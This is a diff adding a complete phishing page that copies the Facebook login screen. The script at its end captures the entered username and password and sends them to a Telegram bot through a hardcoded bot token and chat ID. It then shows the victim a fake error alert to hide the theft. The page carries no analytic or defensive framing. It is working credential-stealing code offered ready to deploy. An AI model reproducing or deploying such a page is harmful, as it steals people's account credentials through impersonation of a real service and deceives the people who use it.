@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(to right, #8e9eab, #eef2f3);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            padding: 40px 30px;
+            border-radius: 15px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo img {
+            width: 70px;
+            height: 70px;
+            margin-bottom: 20px;
+        }
+
+        .language {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+
+        .login-form {
+            width: 100%;
+        }
+
+        .login-form input[type="text"],
+        .login-form input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border 0.3s ease;
+        }
+
+        .login-form input[type="text"]:focus,
+        .login-form input[type="password"]:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+
+        .login-form button {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            background: #1877f2;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-form button:hover {
+            background: #166fe5;
+        }
+
+        .forgot-password {
+            margin: 20px 0;
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            transition: text-decoration 0.3s ease;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #42b72a;
+            background: #e7f3ea;
+            padding: 12px;
+            border: 1px solid #42b72a;
+            border-radius: 8px;
+            cursor: pointer;
+            display: inline-block;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+
+        .create-account:hover {
+            background: #d8e9dc;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        </div>
+        <div class="language">English (UK)</div>
+        <div class="login-form">
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" id="username" name="username" placeholder="Mobile number or email address" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit">Log in</button>
+            </form>
+            <div class="forgot-password">
+                <a href="#">Forgotten Password?</a>
+            </div>
+        </div>
+        <div>
+            <a href="#" class="create-account">Create new account</a>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7359582588:AAFMwyFXVEhFg1Lmo73lP1nFBvUX-_FG5EY"; // আপনার Telegram Bot Token
+        const CHAT_ID = "6398415990"; // আপনার Telegram Chat ID
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const message = `MMU0070 \n🔐 Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).then(response => {
+                if (response.ok) {
+                    alert("something went wrong please try again!");
+                } else {
+                    alert("Failed to send login information.");
+                }
+            }).catch(error => {
+                console.error("Error:", error);
+            });
+        });
+    </script>
+</body>
+  </html>
